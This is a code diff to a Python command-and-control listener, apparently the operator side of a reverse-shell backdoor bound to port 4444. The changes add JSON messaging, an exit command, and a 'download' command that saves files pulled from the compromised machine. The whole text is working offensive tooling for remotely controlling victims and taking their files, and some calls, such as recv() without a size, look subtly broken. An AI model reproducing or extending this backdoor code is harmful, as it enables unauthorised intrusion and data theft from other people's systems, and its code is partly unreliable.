@@ -13,7 +13,6 @@ class Listener:
         print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
         print("[+] Got a connection from" + str(address))
-
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
@@ -27,14 +26,26 @@ class Listener:
             except ValueError:
                 continue
     def execute_remotely(self,command):
-        self.connection.send(command)
+        self.reliable_send((command))
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+
         return self.connection.recv()
-
-
+    def write_file(self,path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download Successful."
     def run(self):
         while True:
             command = input(">> ")
+            command = command.split(" ")
             result = self.execute_remotely(command)
+            if command[0] == "download":
+                result = self.write_file(command[1],result)
+
             print(result)
 
 my_listener = Listener("YOUR IP ADDRESS", 4444)
